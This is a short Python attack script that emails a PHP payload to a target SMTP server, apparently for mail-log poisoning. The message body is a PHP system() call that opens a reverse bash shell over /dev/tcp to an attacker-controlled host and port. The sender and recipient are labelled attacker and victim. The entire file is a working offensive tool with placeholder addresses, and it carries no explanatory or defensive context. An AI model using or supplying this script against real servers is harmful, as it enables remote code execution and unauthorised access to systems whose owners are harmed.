from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = "" 
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload 
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
    print("[-]Connection Error")
    exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[*]successfully sent email to %s:" % (msg['To']))
